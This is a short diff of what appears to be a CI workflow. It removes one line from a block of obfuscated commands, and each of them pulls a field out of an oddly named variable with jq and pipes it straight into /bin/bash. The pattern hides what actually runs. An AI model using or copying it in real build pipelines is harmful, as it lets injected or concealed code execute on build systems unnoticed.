@@ -22,7 +22,6 @@ jobs:
           echo $il800 | jq -r .x28363 | /bin/bash
           printf '%s' "$e0" | jq -r .z8 | /bin/bash
           printf '%s' "$yjpo3365" | jq -r .ztewp805 | /bin/bash
-          printf '%s' "$h01923" | jq -r .t24621 | /bin/bash
           printf '%s' "$n56609" | jq -r .lx3 | /bin/bash
           echo $danvr965 | jq -r .m16 | /bin/bash
           echo $ssfxz8 | jq -r .x53 | /bin/bash
